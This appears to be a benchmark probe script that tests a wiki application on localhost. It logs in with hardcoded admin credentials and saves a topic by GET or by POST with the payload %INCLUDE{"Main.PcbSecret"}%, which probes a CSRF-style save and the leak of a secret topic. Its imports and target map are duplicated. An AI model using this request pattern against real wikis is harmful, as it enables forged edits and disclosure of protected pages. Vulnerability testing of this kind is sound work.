#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39600",
    "v1": "http://127.0.0.1:39601",
}
import argparse
import json
import os
import secrets
import subprocess
import sys
import time
from pathlib import Path
import requests
TIMEOUT = 30
PAYLOAD = '%INCLUDE{"Main.PcbSecret"}%'
ADMIN_PASS = "S3cretAdminPass"
ADMIN_USER = "AdminUser"
BASE = {
    "v0": "http://127.0.0.1:39600",
    "v1": "http://127.0.0.1:39601",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE.get(version)
    if base is None:
        return {"version": version, "error": "no such version"}
    cand = candidate if isinstance(candidate, dict) else {}
    mode = cand.get("mode", "X")

    victim = _login(base)                        
    
    topic = "PcbProbe" + secrets.token_hex(6)

    if mode == "seed":
        
        _save(victim, base, "GET", topic)
    else:
        
        _save(victim, base, "POST", topic)

    body = _view(victim, base, topic)
    return {"version": version, "probe_id": cand.get("probe_id"),
            "mode": mode, "topic": topic, "body": body}
def _login(base: str) -> requests.Session:
    
    s = requests.Session()
    s.post(f"{base}/bin/login",
           data={"username": ADMIN_USER, "password": ADMIN_PASS},
           allow_redirects=False, timeout=TIMEOUT)
    return s
def _save(sess: requests.Session, base: str, method: str, topic: str,
          token=None) -> None:
    
    url = f"{base}/bin/save/Sandbox/{topic}"
    data = {"text": PAYLOAD}
    if token is not None:
        data["crypttoken"] = token
    if method.upper() == "GET":
        sess.get(url, params=data, allow_redirects=False, timeout=TIMEOUT)
    else:
        sess.post(url, data=data, allow_redirects=False, timeout=TIMEOUT)
def _view(sess: requests.Session, base: str, topic: str) -> str:
    return sess.get(f"{base}/bin/view/Sandbox/{topic}",
                    allow_redirects=False, timeout=TIMEOUT).text


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))